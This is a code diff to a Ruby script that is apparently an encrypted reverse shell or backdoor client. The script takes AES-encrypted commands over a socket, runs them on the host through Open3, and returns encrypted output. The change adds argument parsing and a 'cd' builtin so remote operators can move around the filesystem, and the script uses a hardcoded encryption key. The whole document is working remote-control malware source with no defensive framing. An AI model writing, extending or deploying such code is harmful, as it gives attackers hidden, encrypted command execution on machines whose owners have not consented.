@@ -3,6 +3,7 @@ require 'openssl'
 require 'base64'
 require 'socket'
 require 'open3'
+require 'shellwords'
 def encrypt(command)
 	@aes.encrypt
 	@aes.key = @key
@@ -26,14 +27,18 @@ def command_loop(s)
 		command = command.chomp
 		decrypt_data = decrypt(command)
 		exit if decrypt_data == 'exit'
-		#exit if command == 'exit'
-		stdin, stdout_and_stderr, wait_thr = Open3.popen2e("#{decrypt_data}")
-		encrypted_data = encrypt("#{stdout_and_stderr.readlines.join.chomp}\0")
-		#s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
-		s.print("#{encrypted_data}")
+		shell_command, *arguments = Shellwords.shellsplit(decrypt_data)
+		if BUILTINS[shell_command]
+			BUILTINS[shell_command].call(*arguments)
+			encrypted_data = encrypt(Dir.pwd)
+			s.print(encrypted_data)
+		else
+		  stdin, stdout_and_stderr = Open3.popen2e("#{decrypt_data}")
+		  encrypted_data = encrypt("#{stdout_and_stderr.readlines.join.chomp}\0")
+		  s.print("#{encrypted_data}")
+		end
 	}
 	rescue
-		#@s.puts("command does not exist\0")
 		encrypted_data = encrypt("command does not exist\0")
 		@s.print(encrypted_data)
 		command_loop(@s) 
@@ -45,6 +50,7 @@ def connect_to_host()
 	command_loop(@s)
 end
 begin
+	BUILTINS = {'cd' => lambda { |dir| Dir.chdir(dir) }}
 	@aes = OpenSSL::Cipher.new("AES-256-CFB")
 	#rand_key = 32.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9',*'!'..')'].sample}.join
 	@key = 'abcdefghijklmnopqrstuvwxyz123456'
